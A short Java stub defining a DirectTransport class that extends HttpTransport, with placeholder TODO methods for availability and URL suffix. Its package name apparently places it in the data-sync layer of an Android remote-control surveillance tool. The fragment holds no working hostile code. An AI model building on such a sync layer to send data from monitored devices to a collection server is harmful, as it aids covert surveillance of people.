/**
 * 
 */
package com.ht.RCSAndroidGUI.action.sync;

/**
 * @author zeno
 *
 */
public class DirectTransport extends HttpTransport {

	/**
	 * @param host
	 */
	public DirectTransport(String host) {
		super(host);
		
	}

	/* (non-Javadoc)
	 * @see com.ht.RCSAndroidGUI.action.sync.Transport#isAvailable()
	 */
	@Override
	public boolean isAvailable() {
		// TODO 
		return true;
	}

	/* (non-Javadoc)
	 * @see com.ht.RCSAndroidGUI.action.sync.Transport#getSuffix()
	 */
	@Override
	protected String getSuffix() {
		// TODO 
		return "";
	}

}
